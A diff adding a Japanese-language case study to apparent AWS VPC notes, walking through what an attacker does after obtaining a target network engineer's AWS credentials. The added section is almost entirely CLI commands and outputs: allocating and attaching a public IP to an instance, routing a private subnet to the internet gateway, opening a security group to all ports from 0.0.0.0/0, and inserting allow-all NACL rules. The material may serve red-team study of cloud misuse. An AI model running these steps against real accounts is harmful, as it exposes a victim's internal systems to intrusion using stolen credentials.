@@ -91,3 +91,109 @@ https://docs.aws.amazon.com/vpc/latest/mirroring/what-is-traffic-mirroring.html
 - [VPC Peering](https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html)
 - [Transit Gateway](https://aws.amazon.com/transit-gateway/)
 - [Client VPN](https://aws.amazon.com/vpn/client-vpn/)
+
+## ケーススタディ
+
+ターゲットのネットワーク向けエンジニアの AWS 認証情報を入手したというケース。
+
+### EC2 インスタンスに PublicIP アドレスを割り当てる
+
+```shell
+# Public IPアドレスの割り当て（取得）
+~ $ aws ec2 allocate-address
+{
+    "AllocationId": "eipalloc-0cd5faf4a0035e813",
+    "PublicIpv4Pool": "amazon",
+    "NetworkBorderGroup": "us-east-1",
+    "Domain": "vpc",
+    "PublicIp": "52.73.71.55"
+}
+```
+
+```shell
+# ENI（ネットワークインターフェース）を見つける
+~ $ aws ec2 describe-instances > instances.json
+~ $ grep eni instances.json
+                                "AttachmentId": "eni-attach-06a1be2b508125608",
+                            "NetworkInterfaceId": "eni-065a26428f62c9a4d",
+```
+
+```shell
+# IP と ENI を関連付ける
+~ $ aws ec2 associate-address --network-interface-id eni-065a26428f62c9a4d --allocation-id eipalloc-0cd5faf4a0035e813
+{
+    "AssociationId": "eipassoc-03a9e57669ce31b7e"
+}
+```
+
+### プライベートサブネットが直接インターネットアクセスできるようルートテーブルを変更
+
+```shell
+# インターネットGW ID を取得
+~ $ aws ec2 describe-internet-gateways
+```
+
+```shell
+# ルートテーブルIDを取得
+$ aws ec2 describe-route-tables
+```
+
+```shell
+# ルートテーブルにルートを追加
+aws ec2 create-route --route-table-id rtb-0196ffe0d336924d2 --destination-cidr-block 0.0.0.0/0 --gateway-id igw-05daed223ba7228eb
+```
+
+```shell
+# 追加されたことを確認
+aws ec2 describe-route-tables
+```
+
+### セキュリティグループを変更
+
+```shell
+# セキュリティグループを確認
+aws ec2 describe-security-groups > security-groups.json
+```
+
+```shell
+# セキュリティグループルールを追加（sgはステートフルのため1個で良い）
+$ aws ec2 authorize-security-group-ingress  --protocol all --port 0-65535 --cidr 0.0.0.0/0 --group-id sg-0ceca94cffb5fbfa7
+{
+    "Return": true,
+    "SecurityGroupRules": [
+        {
+            "SecurityGroupRuleId": "sgr-04ea450e3d5ddf111",
+            "GroupId": "sg-0ceca94cffb5fbfa7",
+            "GroupOwnerId": "830352411100",
+            "IsEgress": false,
+            "IpProtocol": "-1",
+            "FromPort": -1,
+            "ToPort": -1,
+            "CidrIpv4": "0.0.0.0/0",
+            "SecurityGroupRuleArn": "arn:aws:ec2:us-east-1:830352411100:security-group-rule/sgr-04ea450e3d5ddf111"
+        }
+    ]
+}
+```
+
+### NACL を変更
+
+```shell
+# NACL ID を取得
+$ aws ec2 describe-network-acls > nacls.json
+```
+
+```shell
+# 評価リストの先頭に新しいルールを作成（受信を許可）
+$ aws ec2 create-network-acl-entry --cidr-block 0.0.0.0/0 --ingress  --protocol -1 --rule-action allow --rule-number 1 --network-acl-id acl-0da2b26bc8e3ed5ce
+```
+
+```shell
+# NACL はステートレスのため、送信も許可が必要
+aws ec2 create-network-acl-entry --cidr-block 0.0.0.0/0 --egress  --protocol -1 --rule-action allow --rule-number 1 --network-acl-id acl-0da2b26bc8e3ed5ce
+```
+
+```shell
+# 変更後内容確認
+aws ec2 describe-network-acls --filters Name=network-acl-id,Values=acl-0da2b26bc8e3ed5ce
+```
